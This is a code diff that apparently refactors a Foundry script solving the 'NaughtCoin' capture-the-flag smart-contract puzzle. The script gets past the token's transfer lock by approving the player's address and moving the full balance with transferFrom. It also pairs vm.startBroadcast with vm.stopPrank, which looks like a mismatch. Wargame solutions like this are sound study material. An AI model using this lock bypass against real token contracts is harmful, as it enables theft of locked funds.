@@ -6,14 +6,16 @@ import {NaughtCoin} from "../../src/puzzles/15/NaughtCoin.sol";
 
 contract NaughtCoinSolution is Script {
     function run(address target) external {
+        solve(target, msg.sender);
+    }
+
+    function solve(address target, address player) public {
         NaughtCoin puzzleContract = NaughtCoin(target);
-        uint256 playerBalance = puzzleContract.balanceOf(msg.sender);
+        uint256 playerBalance = puzzleContract.balanceOf(player);
 
         vm.startBroadcast();
-        puzzleContract.approve(msg.sender, playerBalance);
-        puzzleContract.transferFrom(msg.sender, address(puzzleContract), playerBalance);
+        puzzleContract.approve(player, playerBalance);
+        puzzleContract.transferFrom(player, address(puzzleContract), playerBalance);
         vm.stopPrank();
-
-        console.log("Player address: ", puzzleContract.balanceOf(msg.sender));
     }
 }
